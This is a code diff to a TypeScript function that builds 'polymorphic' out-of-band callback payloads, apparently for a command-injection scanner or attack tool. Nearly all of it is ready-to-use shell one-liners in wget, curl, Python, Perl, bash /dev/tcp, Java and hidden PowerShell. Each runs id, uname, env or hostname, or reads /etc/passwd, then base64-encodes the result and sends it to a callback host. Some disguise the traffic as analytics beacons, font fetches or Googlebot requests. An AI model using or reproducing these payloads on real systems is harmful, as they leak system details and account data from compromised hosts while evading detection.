@@ -12,25 +12,51 @@ function cbBase(req: Request): string {
 
 function buildPolymorphicPayloads(base: string, token: string): Record<string, string> {
   const cb = `${base}/${token}`;
+
+  let cbHost = "localhost";
+  let cbPort = "80";
+  try {
+    const u = new URL(base);
+    cbHost  = u.hostname;
+    cbPort  = u.port || (u.protocol === "https:" ? "443" : "80");
+  } catch { /* keep defaults */ }
+
   return {
     wget_pixel:
       `wget -qO/dev/null --user-agent="Mozilla/5.0 AppleWebKit/537.36" "${cb}/pixel.gif?id=$(hostname|base64 -w0 2>/dev/null||hostname|base64)&d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,
+
     analytics_beacon:
       `_d=$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64); curl -sk -H "Referer: https://www.google-analytics.com/collect" -H "Content-Type: text/plain" "${cb}?v=1&tid=UA-000000&cid=\${_d:0:8}&t=pageview&dp=%2F&d=\${_d}" 2>/dev/null &`,
+
     python3_urllib:
-      `python3 -c "import urllib.request as u,base64,os;d=base64.b64encode(os.popen('id && uname -a && env').read(2048).encode()).decode();u.urlopen(urllib.request.Request('${cb}?d='+d,headers={'User-Agent':'Mozilla/5.0','Accept':'image/webp,*/*'}))" 2>/dev/null &`,
+      `python3 -c "import urllib.request as u,base64,os;d=base64.b64encode(os.popen('id && uname -a && env').read(2048).encode()).decode();req=u.Request('${cb}?d='+d,headers={'User-Agent':'Mozilla/5.0','Accept':'image/webp,*/*'});u.urlopen(req)" 2>/dev/null &`,
+
     curl_font_fetch:
       `curl -sk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -H "Sec-Fetch-Dest: font" -H "Sec-Fetch-Mode: cors" "${cb}?d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,
+
     curl_post_xhr:
       `_o=$(id && uname -a && cat /etc/passwd 2>/dev/null|head -5); curl -sk --data-binary "id=$(hostname)&data=$(echo "\${_o}"|base64 -w0 2>/dev/null||echo "\${_o}"|base64)" "${cb}" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Requested-With: XMLHttpRequest" 2>/dev/null &`,
+
     bash_pipe_raw:
       `(id;uname -a;env;cat /etc/passwd 2>/dev/null|head -5)|curl -sk --data-binary @- '${cb}' 2>/dev/null &`,
+
     curl_exfil:
       `_o=$(id && uname -a && hostname && cat /etc/passwd 2>/dev/null|head -5);curl -sk "${cb}?d=$(printf '%s' "$_o"|base64 -w0 2>/dev/null||printf '%s' "$_o"|base64)" 2>/dev/null`,
+
     perl_http:
       `perl -MLWP::UserAgent -e "use MIME::Base64;my \$ua=LWP::UserAgent->new;my \$d=encode_base64(\`id && uname -a\`);chomp(\$d);\$ua->get('${cb}?d='.\$d)" 2>/dev/null &`,
+
     python3_socket:
-      `python3 -c "import socket,os,base64;d=base64.b64encode(os.popen('id && uname -a && hostname').read().encode()).decode();s=socket.create_connection(('${cb.replace(/^https?:\/\//, "").split("/")[0]?.split(":")[0]}',80));s.send(b'GET /api/oob/cb/${token}?d='+d.encode()+b' HTTP/1.0\r\nHost: ${cb.replace(/^https?:\/\//, "").split("/")[0]}\r\n\r\n');s.close()" 2>/dev/null &`,
+      `python3 -c "import socket,os,base64;d=base64.b64encode(os.popen('id && uname -a && hostname').read().encode()).decode();s=socket.create_connection(('${cbHost}',${cbPort}));s.send(b'GET /api/oob/cb/${token}?d='+d.encode()+b' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n');s.close()" 2>/dev/null &`,
+
+    bash_devtcp:
+      `exec 3>/dev/tcp/${cbHost}/${cbPort} 2>/dev/null && printf 'GET /api/oob/cb/${token}?d='$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64)' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n'>&3 && exec 3>&- 2>/dev/null &`,
+
+    java_url:
+      `java -cp . -e "new java.net.URL(\\"${cb}?d=\\"+java.util.Base64.getEncoder().encodeToString(Runtime.getRuntime().exec(new String[]{\\"sh\\",\\"-c\\","id && uname -a\\"}).getInputStream().readAllBytes())).openStream().close();" 2>/dev/null & python3 -c "import urllib.request,base64,subprocess;urllib.request.urlopen('${cb}?d='+base64.b64encode(subprocess.check_output(['sh','-c','id && uname -a'],stderr=-1)).decode())" 2>/dev/null &`,
+
+    powershell_iwr:
+      `powershell -NoP -NonI -W Hidden -c "iwr -Uri '${cb}?d='+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((iex 'id 2>&1')))+'' -UseBasicParsing" 2>/dev/null & cmd /c "powershell -c \"$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c id 2^>^&1)));iwr -Uri '${cb}?d='+$d -UseBasicParsing\" 2>nul"`,
   };
 }
 
